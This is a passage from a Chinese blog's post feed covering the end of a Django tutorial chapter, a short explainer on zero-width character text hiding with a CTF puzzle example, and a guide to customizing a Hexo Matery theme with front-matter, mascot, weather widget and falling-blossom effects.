<p>这是第一个除request对象外还包含另一个形参的视图函数。这个函数接受正则表达式(<code>?P&lt;topic_id&gt;\d+</code>)捕获的值，并将其存储到topic_id中（见❶）。在❷处，我们使用get()来获取指定的主题，就像前面在Django shell中所做的那样。在❸处，我们获取与该主题相关联的条目，并将它们按date_added排序：date_added前面的减号指定按降序排列，即先显示最近的条目。我们将主题和条目都存储在字典context中（见❹），再将这个字典发送给模板topic.html（见❺）。</p>
<blockquote>
<p>注意　❷处和❸处的代码被称为查询，因为它们向数据库查询特定的信息。在自己的项目中编写这样的查询时，先在Django shell中进行尝试大有裨益。相比于编写视图和模板，再在浏览器中检查结果，在shell中执行代码可更快地获得反馈。</p>
</blockquote>
<h5 id="3．模板-1"><a href="#3．模板-1" class="headerlink" title="3．模板"></a>3．模板</h5><p>这个模板需要显示主题的名称和条目的内容；如果当前主题不包含任何条目，我们还需向用户指出这一点：</p>
<p>topic.html</p>
<pre><code>{% extends 'learning_logs/base.html' %}
{% block content %}
  &lt;p&gt;Topic: {{ topic }}&lt;/p&gt; ➊
  &lt;p&gt;Entries:&lt;/p&gt;
  &lt;ul&gt;❷
  {% for entry in entries %}❸
    <li>
	  <p>{{ entry.date_added|date:'M d, Y H:i'}}</p>❹
	  <!--其中的'|'表示模板过滤器，过滤器date：指定格式显示日期-->
	  <p>{{ entry.text|linebreaks }}</p> ❺
	  <!--过滤器linebreaks将包含换行符的长条目转换成浏览器能识别的格式-->
    </li>
  {% empty %}❻
	</code><li><code>
	  There are no entries for this topic yet.
	<!--1i-->
  {% endfor %}
  &lt;/ul&gt;
{% endblock content %}
</code></li></pre><p>像这个项目的其他页面一样，这里也继承了base.html。接下来，我们显示当前的主题（见❶），它存储在模板变量<code>{ { topic } }</code>中。为什么可以使用变量topic呢？因为它包含在字典context中。接下来，我们开始定义一个显示每个条目的项目列表（见❷），并像前面显示所有主题一样遍历条目（见❸）。</p>
<p>每个项目列表项都将列出两项信息：条目的时间戳和完整的文本。为列出时间戳（见❹），我们显示属性date_added的值。在Django模板中，竖线（|）表示模板过滤器——对模板变量的值进行修改的函数。过滤器<code>date: 'M d, Y H:i'</code>以这样的格式显示时间戳：January 1, 2015 23:00。接下来的一行显示text的完整值，而不仅仅是entry的前50个字符。过滤器linebreaks（见❺）将包含换行符的长条目转换为浏览器能够理解的格式，以免显示为一个不间断的文本块。在❻处，我们使用模板标签<code>{ % empty % }</code>打印一条消息，告诉用户当前主题还没有条目。</p>
<h5 id="4．将显示所有主题的页面中的每个主题都设置为链接"><a href="#4．将显示所有主题的页面中的每个主题都设置为链接" class="headerlink" title="4．将显示所有主题的页面中的每个主题都设置为链接"></a>4．将显示所有主题的页面中的每个主题都设置为链接</h5><p>在浏览器中查看显示特定主题的页面前，我们需要修改模板topics.html，让每个主题都链接到相应的网页，如下所示：</p>
<pre><code>--snip--
    {% for topic in topics %}
      &lt;li&gt;
        &lt;a href=" {% url 'learning_logs:topic' topic.id %}"&gt;{{ topic }} &lt;/a&gt;
      &lt;/1i&gt;
    {% empty %}
--snip--</code></pre><p>我们使用模板标签url根据learning_logs中名为topic的URL模式来生成合适的链接。这个URL模式要求提供实参topic_id，因此我们在模板标签url中添加了属性topic.id。现在，主题列表中的每个主题都是一个链接，链接到显示相应主题的页面，如<a href="http://localhost:8000/topics/1/。">http://localhost:8000/topics/1/。</a></p>
<p>如果你刷新显示所有主题的页面，再单击其中的一个主题，将看到类似于下图所示的页面。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202338.png" alt="特定主题的详细页面，其中显示了该主题的所有条目"></p>
<h4 id="动手试一试-3"><a href="#动手试一试-3" class="headerlink" title="动手试一试"></a>动手试一试</h4><h5 id="18-7-模板文档："><a href="#18-7-模板文档：" class="headerlink" title="18-7 模板文档："></a>18-7 模板文档：</h5><p>请浏览Django模板文档，其网址为<a href="https://docs.djangoproject.com/en/1.8/ref/templates/。自己开发项目时，可再回过头来参考该文档。">https://docs.djangoproject.com/en/1.8/ref/templates/。自己开发项目时，可再回过头来参考该文档。</a></p>
<h5 id="18-8-比萨店页面："><a href="#18-8-比萨店页面：" class="headerlink" title="18-8 比萨店页面："></a>18-8 比萨店页面：</h5><p>在练习18-6中开发的项目Pizzeria中添加一个页面，它显示供应的比萨的名称。然后，将每个比萨名称都设置成一个链接，单击这种链接将显示一个页面，其中列出了相应比萨的配料。请务必使用模板继承来高效地创建页面。</p>
<h3 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h3><p>在本章中，你首先学习了如何使用Django框架来创建Web应用程序。你制定了简要的项目规范，在虚拟环境中安装了Django，创建了一个项目，并核实该项目已正确地创建。你学习了如何创建应用程序，以及如何定义表示应用程序数据的模型。你学习了数据库，以及在你修改模型后，Django可为你迁移数据库提供什么样的帮助。你学习了如何创建可访问管理网站的超级用户，并使用管理网站输入了一些初始数据。</p>
<p>你还探索了Django shell，它让你能够在终端会话中处理项目的数据。你学习了如何定义URL、创建视图函数以及编写为网站创建网页的模板。最后，你使用了模板继承，它可简化各个模板的结构，并使得修改网站更容易。</p>
<p>在第19章，我们将创建对用户友好而直观的网页，让用户无需通过管理网站就能添加新的主题和条目，以及编辑既有的条目。我们还将添加一个用户注册系统，让用户能够创建账户和自己的学习笔记。让任意数量的用户都能与之交互，是Web应用程序的核心所在。</p>
]]></content>
      <categories>
        <category>django框架</category>
      </categories>
      <tags>
        <tag>django入门</tag>
      </tags>
  </entry>
  <entry>
    <title>零宽度字符加密</title>
    <url>/zerokuanduzifujiami.html</url>
    <content><![CDATA[<p>​​        简而言之，就是字节宽度为0的特殊字符.<br>零宽度字符是一些不可见的，不可打印的字符。它们存在于页面中主要用于调整字符的显示格式。</p>
<span id="more"></span>
<p>下面就是一些常见的零宽度字符及它们的unicode码和原本用途：</p>
<p>1.零宽度空格符 (zero-width space) U+200B : 用于较长单词的换行分隔<br>2.零宽度非断空格符 (zero width no-break space) U+FEFF : 用于阻止特定位置的换行分隔<br>3.零宽度连字符 (zero-width joiner) U+200D : 用于阿拉伯文与印度语系等文字中，使不会发生连字的字符间产生连字效果<br>4.零宽度断字符 (zero-width non-joiner) U+200C : 用于阿拉伯文，德文，印度语系等文字中，阻止会发生连字的字符间的连字效果<br>5.左至右符 (left-to-right mark) U+200E : 用于在混合文字方向的多种语言文本中（例：混合左至右书写的英语与右至左书写的希伯来语），规定排版文字书写方向为左至右<br>6.右至左符 (right-to-left mark) U+200F : 用于在混合文字方向的多种语言文本中，规定排版文字书写方向为右至左</p>
<h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>首先，输入需要被加密的内容将被转换为其二进制形式，然后该二进制将被转换为一系列表示每个二进制数字的零宽度字符。然后可以将零宽度的字符串不可见地插入正常文本中。如果将文本粘贴在其他地方，则可以提取零宽度的字符串，然后反向进行操作以找出被加密的内容<br><a href="https://blog.csdn.net/qq_38805084/article/details/102682864">具体解释</a></p>
<h5 id="具体加密过程："><a href="#具体加密过程：" class="headerlink" title="具体加密过程："></a>具体加密过程：</h5><p>1.将需加密的内容转换为二进制<br>只是将每个字符转换为其等效的二进制</p>
<pre><code>const zeroPad = num =&gt; ‘00000000’.slice(String(num).length) + num;
const textToBinary = username =&gt; (
  username.split('').map(char =&gt;
    zeroPad(char.charCodeAt(0).toString(2))).join(' ')
);</code></pre><p>2.将二进制转换为0宽字符<br>它将遍历二进制字符串，并将每个1转换为0宽度空间，将每个0转换为零宽非连接符。<br>转换字母后，我们将插入0宽连接符，然后再下一个。</p>
<pre><code>const binaryToZeroWidth = binary =&gt; (
  binary.split('').map((binaryNum) =&gt; {
    const num = parseInt(binaryNum, 10);
    if (num === 1) {
      return ''; // zero-width space
    } else if (num === 0) {
      return '‌'; // zero-width non-joiner
    }
    return '‍'; // zero-width joiner
  }).join('') // zero-width no-break space
);
</code></pre><p>3.插入正常文本中<br>需要注意的是加密与解密所使用的字典必须一致，也就是说，在哪儿进行加密的，就要在哪儿解密。<br>解密过程就是加密过程的反逻辑<br><img src="https://gitee.com/marmalade0/images/raw/master/img/20210306213038.png" alt="75afb321ef37e106885294380f81a016.png"><br>零宽度字节在网页中不会被显示</p>
<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>[UTCTF2020]zero<br>题目zero暗示了零宽度字符加密<br>网上寻找在线解密网站<a href="http://330k.github.io/misc_tools/unicode_steganography.html">零宽度字符加密解密网站</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>零宽度字符加密</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-Matery主题细致美化(下)</title>
    <url>/Materysettings2.html</url>
    <content><![CDATA[<h3 id="新建文章模板修改"><a href="#新建文章模板修改" class="headerlink" title="新建文章模板修改"></a>新建文章模板修改</h3><p>首先为了新建文章方便，我们可以修改一下文章模板，可以将<code>/scaffolds/post.md</code>修改为如下代码：</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: {{ title }}
date: {{ date }}
author: 
img: 
coverImg: 
top: false
cover: false
toc: true
mathjax: false
password:
summary:
keywords:
tags:
categories:
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样新建文章后 一些<code>Front-matter</code>参数不用你自己补充了，修改对应信息就可以了。</p>
<h4 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h4><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但原作者建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p>
<table>
<thead>
<tr>
<th align="left">配置选项</th>
<th align="left">默认值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">title</td>
<td align="left"><code>Markdown</code> 的文件标题</td>
<td align="left">文章标题，强烈建议填写此选项</td>
</tr>
<tr>
<td align="left">date</td>
<td align="left">文件创建时的日期时间</td>
<td align="left">发布时间，强烈建议填写此选项，且最好保证全局唯一</td>
</tr>
<tr>
<td align="left">author</td>
<td align="left">根 <code>_config.yml</code> 中的 <code>author</code></td>
<td align="left">文章作者</td>
</tr>
<tr>
<td align="left">img</td>
<td align="left"><code>featureImages</code> 中的某个值</td>
<td align="left">文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td>
</tr>
<tr>
<td align="left">top</td>
<td align="left"><code>true</code></td>
<td align="left">推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td>
</tr>
<tr>
<td align="left">cover</td>
<td align="left"><code>false</code></td>
<td align="left"><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td>
</tr>
<tr>
<td align="left">coverImg</td>
<td align="left">无</td>
<td align="left"><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>
</tr>
<tr>
<td align="left">password</td>
<td align="left">无</td>
<td align="left">文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td>
</tr>
<tr>
<td align="left">toc</td>
<td align="left"><code>true</code></td>
<td align="left">是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td>
</tr>
<tr>
<td align="left">mathjax</td>
<td align="left"><code>false</code></td>
<td align="left">是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td>
</tr>
<tr>
<td align="left">summary</td>
<td align="left">无</td>
<td align="left">文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>
</tr>
<tr>
<td align="left">categories</td>
<td align="left">无</td>
<td align="left">文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>
</tr>
<tr>
<td align="left">tags</td>
<td align="left">无</td>
<td align="left">文章标签，一篇文章可以多个标签</td>
</tr>
<tr>
<td align="left">keywords</td>
<td align="left">文章标题</td>
<td align="left">文章关键字，SEO 时需要</td>
</tr>
<tr>
<td align="left">reprintPolicy</td>
<td align="left">cc_by</td>
<td align="left">文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>
</tr>
</tbody></table>
<h4 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h4><pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: typora-vue-theme主题介绍
date: 2018-09-07 09:25:00
author: 赵奇
img: /source/images/xxx.jpg
top: true
cover: true
coverImg: /images/1.jpg
password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
toc: false
mathjax: false
summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
categories: Markdown
tags:
  - Typora
  - Markdown
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="看板娘模块的安装和使用"><a href="#看板娘模块的安装和使用" class="headerlink" title="看板娘模块的安装和使用"></a>看板娘模块的安装和使用</h3><p>模块安装：</p>
<pre class="line-numbers language-bash"><code class="language-bash">cnpm <span class="token function">install</span> --save hexo-helper-live2d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载完成后，可以在node_modules文件夹中找到自己安装的插件。</p>
<p>然后下载你想要的看板娘模块（可以自己到网上找哪个合心意的），执行命令：</p>
<pre class="line-numbers language-bash"><code class="language-bash">cnpm <span class="token function">install</span> <span class="token punctuation">{</span>packagename<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true"># 例如cnpm install live2d-widget-model-haru</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>下载完成后，回到blog根目录下配置_config.yml，添加以下代码（model要根据自己情况设置）：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">live2d</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">scriptFrom</span><span class="token punctuation">:</span> local
  <span class="token key atrule">pluginRootPath</span><span class="token punctuation">:</span> live2dw/
  <span class="token key atrule">pluginJsPath</span><span class="token punctuation">:</span> lib/
  <span class="token key atrule">pluginModelPath</span><span class="token punctuation">:</span> assets/
  <span class="token key atrule">tagMode</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token key atrule">debug</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token key atrule">model</span><span class="token punctuation">:</span>
    <span class="token key atrule">use</span><span class="token punctuation">:</span> live2d<span class="token punctuation">-</span>widget<span class="token punctuation">-</span>model<span class="token punctuation">-</span>z16
  <span class="token key atrule">display</span><span class="token punctuation">:</span>
    <span class="token key atrule">position</span><span class="token punctuation">:</span> right
    <span class="token key atrule">width</span><span class="token punctuation">:</span> <span class="token number">200</span>
    <span class="token key atrule">height</span><span class="token punctuation">:</span> <span class="token number">400</span>
  <span class="token key atrule">mobile</span><span class="token punctuation">:</span>
    <span class="token key atrule">show</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样在右下角有看板娘啦！</p>
<h3 id="添加博客天气插件"><a href="#添加博客天气插件" class="headerlink" title="添加博客天气插件"></a>添加博客天气插件</h3><p>中国天气网：<a href="https://cj.weather.com.cn/">https://cj.weather.com.cn/</a></p>
<p>选择自定义插件—&gt;自定义样式——&gt;生成代码，然后会生成这样一段代码</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- Weather Widget --></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"> WIDGET <span class="token operator">=</span> <span class="token punctuation">{</span>FID<span class="token punctuation">:</span> <span class="token string">'your FID'</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://apip.weatherdt.com/float/static/js/r.js?v<span class="token punctuation">=</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在 /themes/matery/source/layout/_widget 新建文件 weather.ejs，把上面生成的代码添加进入,可以设置只有桌面端显示,如下修改:</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 天气接口--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">
  WIDGET <span class="token operator">=</span> <span class="token punctuation">{</span>FID<span class="token punctuation">:</span> <span class="token string">'1tFpFZ5Mtj'</span><span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token comment" spellcheck="true">&lt;!-- &lt;script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111">&lt;/script> --></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">
  <span class="token comment" spellcheck="true">//只在桌面版网页启用特效</span>
  <span class="token keyword">var</span> windowWidth <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">width</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>windowWidth <span class="token operator">></span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111">&lt;\/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后在 /themes/matery/layout/_partial/layout.ejs 中添加如下代码：</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 天气接口控件  洪卫 shw2018 add <span class="token number">2019.09</span><span class="token punctuation">.</span><span class="token number">09</span> <span class="token operator">--</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>weather<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token function">partial</span><span class="token punctuation">(</span><span class="token string">'_widget/weather'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在主题配置文件 .yml中配置:</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 启用天气接口插件</span>
<span class="token key atrule">weather</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>当然,如果你不想搞这么复杂,可以直接将下面代码插入 /themes/matery/layout/_partial/layout.ejs 中即可使用:</strong></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">
    WIDGET <span class="token operator">=</span> <span class="token punctuation">{</span>FID<span class="token punctuation">:</span> <span class="token string">'1tFpFZ5Mtj'</span><span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://apip.weatherdt.com/float/static/js/r.js?v<span class="token punctuation">=</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="添加页面樱花飘落动效"><a href="#添加页面樱花飘落动效" class="headerlink" title="添加页面樱花飘落动效"></a>添加页面樱花飘落动效</h3><hr>
<p>在 <code>/themes/matery/source/js</code> 新建文件 <code>sakura.js</code>，并添加如下代码</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> stop<span class="token punctuation">,</span> staticx<span class="token punctuation">;</span>
<span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUgAAAEwCAYAAADVZeifAAAACXBIWXMAAACYAAAAmAGiyIKYAAAHG2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBSaWdodHM9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9yaWdodHMvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcFJpZ2h0czpNYXJrZWQ9IkZhbHNlIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6NDFDMjQxQjYyNjIwNjgxMTgwODNEMjE2MDAzOTU1NDQiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDozNDVjOWViOC04NDc4LTFkNDctOGRjMi0yZDkyOGNhYTYxZWQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE4LTA1LTA5VDE0OjQ5OjM3KzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjEyMjVlZWE3LTEyY2QtMTY0NC04ZDAzLWFjOTE2ZTAxZDQ1YyIgc3RSZWY6ZG9jdW1lbnRJRD0idXVpZDoxRDIwNUFGNjZCRDlFNTExOUM5REMwMzg2RjlEQjFGNyIvPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDphYmMzNjIzMy1hOWNkLWNiNDQtODViYi0zZTgyMjEwYmIxMjYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDlUMTQ6NTE6MjUrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4IChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiBzdEV2dDp3aGVuPSIyMDE4LTA1LTA5VDE0OjUxOjI1KzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOCAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+XCpBoAAApBxJREFUeNrs/cmSI8u2LIipLnMHosnc59Z7jyxhjSg1oggn/EWO+SP8B34JhRyWCItk1at7786MBnBbWoNlZm4OOLrIvc8+t45bCjIQjibQuKuvTlUpCdva1ra2ta3zZdtHsK1tbWtbG0Bua1vb2tYGkNva1ra2tQHktra1rW1tALmtbW1rWxtAbmtb29rWBpDb2ta2trUB5La2ta1tbQC5rW1ta1sbQG5rW9va1gaQ29rWtra1AeS2trWtbW1rA8htbWtb29oAclvb2ta2NoDc1ra2ta0NILe1rW1tawPIbW1rW9vaAHJb29rWtjaA3Na2trWtDSC3ta1tbWsDyG1ta1vb2gByW9va1rY2gNzWtra1rW1tALmtbW1rWxtAbmtb29rWBpDb2ta2trUB5La2ta1tbQC5rW1ta1sbQG5rW9va1gaQ29rWtra1AeS2trWtbW0Aua1tbWtbG0Bua1vb2tY/3xr+o7+Bf/2//z/+1OfPAIgJErGbMj7M8fue+O1A7LLjcxyw+5hwZMbgQnLgKIftRsgMyYUjBYNhOn6AADiMOGDCyIQBCflwwNEdw24HHA5AzhjHJxyQwZTADLgmHJPhDRnfjo6PlPHbNOJDGZgEZsIgOAHPR/yPwxv+28MONOBghIEAiXce8LkzuAG/vRP7o+EzAcMRyNlxoJByxj4T/8su4+UgPE3A++jg5yfe/lvD73/b4eVfM17/zfE//y3h6UjsJ8f/9N8m/Of/Cnz/d0cegHES/t///Q7HHfG/+/8JT0fABGQTzIEkYMyGf/0vBh8N3/99wv/rP/1/sDs6/i//+t8DZhCATOFwzPj4